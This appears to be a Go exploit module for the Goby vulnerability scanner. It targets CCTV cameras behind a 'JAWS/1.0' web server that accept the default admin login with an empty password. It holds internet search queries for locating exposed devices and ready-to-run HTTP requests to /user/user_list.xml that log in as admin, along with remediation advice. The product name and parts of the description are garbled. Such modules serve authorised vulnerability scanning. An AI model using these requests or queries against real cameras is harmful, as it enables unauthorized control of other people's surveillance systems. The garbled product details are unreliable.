package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Pwning CCTV cameras user_list.xml weak-pass vulnerability",
    "Description": "<p>Pwning CCTV cameras are cameras.</p><p></p><p>Pwning CCTV cameras have the default password vulnerability. Attackers can use the default password admin/ null to control the whole platform and operate the core functions with the administrator rights.</p>",
    "Product": "Pwning CCTV cameras",
    "Homepage": "https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "server=\"JAWS/1.0\" && body='<span id=\"submit\" style=\"float:right; margin-right:98px; font-size:18px; color:#CCC; width:78px; height:42px; border-radius:4px; cursor:pointer;\" type=\"button\" value=\"\"><script type=\"text/javascript\">document.write'",
    "GobyQuery": "server=\"JAWS/1.0\" && body='<span id=\"submit\" style=\"float:right; margin-right:98px; font-size:18px; color:#CCC; width:78px; height:42px; border-radius:4px; cursor:pointer;\" type=\"button\" value=\"\"><script type=\"text/javascript\">document.write'",
    "Level": "1",
    "Impact": "<p>Pwning CCTV cameras have the default password vulnerability. Attackers can use the default password admin/ null to control the whole platform and operate the core functions with the administrator rights.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/user/user_list.xml?username=admin&password=&_=1659187148037",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/xml",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "permit_setting=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "you=\"admin\" add_user=\"yes\" ret=\"success\" mesg=\"check in success\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/user/user_list.xml?username=admin&password=&_=1659187148037",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/xml",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "permit_setting=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "you=\"admin\" add_user=\"yes\" ret=\"success\" mesg=\"check in success\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|用户名:admin  密码为空||"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "Pwning CCTV cameras user_list.xml 默认口令漏洞",
            "Product": "Pwning CCTV cameras",
            "Description": "<p><span style=\"color: rgb(41, 43, 44);\"></span>Pwning CCTV cameras 是一款摄像头工具<span style=\"color: rgb(41, 43, 44); font-size: 16px;\">。</span><br></p><p><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Pwning CCTV cameras</span>存在默认口令漏洞,攻击者使用默认口</span>令 admin/空<span style=\"color: rgb(41, 43, 44);\">&nbsp;即可控制整个平台，使用管理员权限操作核心的功能。</span></span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(41, 43, 44); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37);\">Pwning CCTV cameras</span>存在默认口令漏洞,攻击者使用默认口</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">令 admin/空</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">&nbsp;即可控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Pwning CCTV cameras user_list.xml weak-pass vulnerability",
            "Product": "Pwning CCTV cameras",
            "Description": "<p>Pwning CCTV cameras are cameras.</p><p></p><p><span style=\"color: rgb(74, 144, 226);\">Pwning CCTV cameras have the default password vulnerability. Attackers can use the default password admin/ null to control the whole platform and operate the core functions with the administrator rights.</span></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"color: rgb(74, 144, 226); font-size: 16px;\">Pwning CCTV cameras have the default password vulnerability. Attackers can use the default password admin/ null to control the whole platform and operate the core functions with the administrator rights.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10695"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}